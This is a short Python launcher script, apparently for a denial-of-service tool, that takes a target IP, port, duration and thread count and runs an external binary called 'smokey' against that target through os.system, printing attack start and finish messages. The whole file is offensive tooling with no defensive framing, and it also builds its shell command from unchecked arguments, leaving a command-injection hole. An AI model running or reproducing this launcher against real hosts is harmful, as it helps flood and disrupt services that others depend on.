import sys
import os
import threading
import time
import signal

# Argument validation
if len(sys.argv) != 5:
    print("Usage: python3 runner.py <ip> <port> <time> <threads>")
    sys.exit(1)

# Parse arguments
try:
    ip = sys.argv[1]
    port = int(sys.argv[2])  # Convert port to integer
    attack_time = int(sys.argv[3])  # Convert attack time to integer
    threads = int(sys.argv[4])  # Convert threads to integer
except ValueError:
    print("Error: Invalid argument format. Ensure <port>, <time>, and <threads> are integers.")
    sys.exit(1)

# Attack function
def run_attack():
    try:
        # Execute the attack command
        os.system(f"./smokey {ip} {port} {attack_time} {threads}")
    except Exception as e:
        print(f"Error during attack execution: {e}")

# Graceful shutdown handler
def graceful_shutdown(signum, frame):
    print("\nGracefully shutting down the attack...")
    sys.exit(0)

# Register signal handlers for graceful shutdown
signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)

# Start attack in a daemon thread (will exit cleanly)
attack_thread = threading.Thread(target=run_attack, daemon=True)
attack_thread.start()

# Log the start of the attack
print(f"Attack started on {ip}:{port} with {threads} threads for {attack_time} seconds.")

# Sleep for the duration of the attack
try:
    time.sleep(attack_time)
except KeyboardInterrupt:
    print("\nAttack interrupted by user. Exiting...")
    sys.exit(0)

# Log the completion of the attack
print("Attack finished, exiting runner.py...")
sys.exit(0)
